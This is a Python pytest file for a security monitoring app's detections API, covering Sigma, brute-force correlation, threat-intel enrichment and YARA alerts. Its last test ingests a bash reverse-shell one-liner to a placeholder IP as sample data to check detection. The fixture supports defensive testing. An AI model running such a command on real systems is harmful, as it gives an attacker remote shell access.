import app.api.routes.detections as detections_module
from app.core.config import settings

INGEST_HEADERS = {"X-API-Key": settings.ingest_api_key}


def _auth_headers(
    client, email="detections@example.com", password="correcthorsebattery"
):
    client.post("/api/v1/auth/register", json={"email": email, "password": password})
    token = client.post(
        "/api/v1/auth/login", data={"username": email, "password": password}
    ).json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


def test_run_detection_requires_auth(client):
    response = client.post("/api/v1/detections/run")
    assert response.status_code == 401


def test_run_detection_saves_sigma_and_correlation_alerts(client, monkeypatch):
    fake_sigma_alert = {
        "rule_id": "test.sigma.1",
        "rule_title": "Fake Sigma Rule",
        "detection_type": "sigma",
        "severity": "low",
        "mitre_techniques": [],
        "source_event_id": "evt-sigma-1",
        "summary": "fake sigma match",
        "details": {},
    }
    fake_correlation_alert = {
        "rule_id": "correlation.ssh_bruteforce",
        "rule_title": "SSH Brute Force (Correlated)",
        "detection_type": "correlation",
        "severity": "high",
        "mitre_techniques": ["T1110"],
        "source_event_id": "bruteforce:203.0.113.5:2026071217",
        "summary": "fake bruteforce match",
        "details": {},
    }
    monkeypatch.setattr(
        detections_module,
        "run_sigma_detection",
        lambda lookback_minutes: [fake_sigma_alert],
    )
    monkeypatch.setattr(
        detections_module,
        "run_bruteforce_detection",
        lambda lookback_minutes: [fake_correlation_alert],
    )

    headers = _auth_headers(client)
    response = client.post("/api/v1/detections/run", headers=headers)
    assert response.status_code == 200
    body = response.json()
    assert body["sigma_alerts_created"] == 1
    assert body["correlation_alerts_created"] == 1
    assert body["total_alerts_created"] == 2

    # Running again with the same fake data should dedupe to zero new alerts —
    # proves the unique constraint, not just the counting logic, is doing its job.
    response_again = client.post("/api/v1/detections/run", headers=headers)
    assert response_again.json()["total_alerts_created"] == 0


def test_sigma_alert_with_public_source_ip_gets_enriched(client, monkeypatch):
    from app.models.ioc_enrichment import IOCEnrichment

    fake_alert = {
        "rule_id": "test.sigma.enrich",
        "rule_title": "Fake Rule With Public IP",
        "detection_type": "sigma",
        "severity": "low",
        "mitre_techniques": [],
        "source_event_id": "evt-enrich-1",
        "summary": "fake match with a public IP",
        "details": {"matched_event": {"source_ip": "118.25.6.39", "message": "test"}},
    }
    fake_enrichment = IOCEnrichment(
        indicator_type="ip", indicator_value="118.25.6.39", combined_threat_score=88
    )
    monkeypatch.setattr(
        detections_module, "run_sigma_detection", lambda lookback_minutes: [fake_alert]
    )
    monkeypatch.setattr(
        detections_module, "run_bruteforce_detection", lambda lookback_minutes: []
    )
    # enrich_ip is called from inside enrich_alert_source_ip's own module now
    # (detections.py only imports enrich_alert_source_ip itself) — patch it
    # where it's actually used, same principle as the OpenSearch mocking in
    # conftest.py.
    import app.threat_intel.enrichment_service as enrichment_service_module

    monkeypatch.setattr(
        enrichment_service_module, "enrich_ip", lambda db, ip: fake_enrichment
    )

    headers = _auth_headers(client)
    client.post("/api/v1/detections/run", headers=headers)

    response = client.get("/api/v1/detections/alerts", headers=headers)
    alert = next(a for a in response.json() if a["rule_id"] == "test.sigma.enrich")
    assert alert["details"]["threat_intel"]["combined_threat_score"] == 88
    assert alert["details"]["threat_intel"]["indicator"] == "118.25.6.39"


def test_list_alerts_requires_auth(client):
    response = client.get("/api/v1/detections/alerts")
    assert response.status_code == 401


def test_list_alerts_returns_created_alerts(client, monkeypatch):
    fake_alert = {
        "rule_id": "test.sigma.list",
        "rule_title": "Fake Rule For Listing",
        "detection_type": "sigma",
        "severity": "medium",
        "mitre_techniques": [],
        "source_event_id": "evt-list-1",
        "summary": "fake match for list test",
        "details": {},
    }
    monkeypatch.setattr(
        detections_module, "run_sigma_detection", lambda lookback_minutes: [fake_alert]
    )
    monkeypatch.setattr(
        detections_module, "run_bruteforce_detection", lambda lookback_minutes: []
    )

    headers = _auth_headers(client)
    client.post("/api/v1/detections/run", headers=headers)

    response = client.get("/api/v1/detections/alerts", headers=headers)
    assert response.status_code == 200
    alerts = response.json()
    assert any(a["rule_id"] == "test.sigma.list" for a in alerts)
    assert all(a["status"] == "new" for a in alerts)


def test_yara_match_during_ingestion_creates_alert(client, mock_opensearch):
    headers = _auth_headers(client)
    client.post(
        "/api/v1/ingest/events",
        json={
            "source_type": "generic_json",
            "payload": {
                "host": "web01",
                "message": "bash -i >&/dev/tcp/203.0.113.5/4444 0>&1",
            },
        },
        headers=INGEST_HEADERS,
    )

    response = client.get("/api/v1/detections/alerts", headers=headers)
    alerts = response.json()
    yara_alerts = [a for a in alerts if a["detection_type"] == "yara"]
    assert len(yara_alerts) == 1
    assert yara_alerts[0]["mitre_techniques"] == ["T1059"]
    assert yara_alerts[0]["severity"] == "high"
